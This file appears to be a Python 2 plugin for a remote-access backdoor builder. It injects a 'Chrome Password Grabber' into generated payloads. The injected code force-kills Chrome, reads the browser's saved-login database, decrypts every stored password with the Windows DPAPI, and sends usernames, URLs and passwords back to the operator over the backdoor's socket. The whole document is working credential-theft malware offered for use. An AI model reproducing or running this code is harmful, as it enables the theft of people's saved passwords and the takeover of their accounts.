# verified
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import os')
        config.import_statements.append('import sqlite3')
        config.import_statements.append('from win32crypt import CryptUnprotectData')
        config.functions.append('''
def chrome_active_dump():
    os.system('taskkill /f /im chrome.exe')
    msg = '[+]Killed chrome process'
    info_list = []
    connection = sqlite3.connect(os.getenv('localappdata') + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\' + 'Login Data')
    with connection:
        cursor = connection.cursor()
        v = cursor.execute(
            'SELECT action_url, username_value, password_value FROM logins')
        value = v.fetchall()
    for origin_url, username, password in value:    
        password = CryptUnprotectData(
            password, None, None, None, 0)[1]
        if password:
            info_list.append({
                'origin_url': origin_url,
                'username': username,
                'password': str(password)
            })
    msg += '\\n[*]Dumped passwords : '
    if not info_list:
        msg += '\\n[-]No passwords present'
    else:
        for i in info_list:
            msg += '\\n   [+]Username : ' + i['username'].encode('ascii','ignore')
            msg += '\\n      URL      : ' + i['origin_url'].encode('ascii','ignore')
            msg += '\\n      Password : ' + i['password'].encode('ascii','ignore')
    s.sendall(msg)''')
        config.logics.append('''
            elif command == "chrome_active":
                chrome_active_dump()''')
    elif option == 'info':
        print '\nName             : Chrome Password Grabber (Active)' \
              '\nOS               : Windows' \
              '\nRequired Modules : pypiwin32 (external), os' \
              '\nCommands         : chrome_active' \
              '\nDescription      : Grabs saved chrome passwords and sends them back, will kill the chrome process first so it is more aggressive\n'
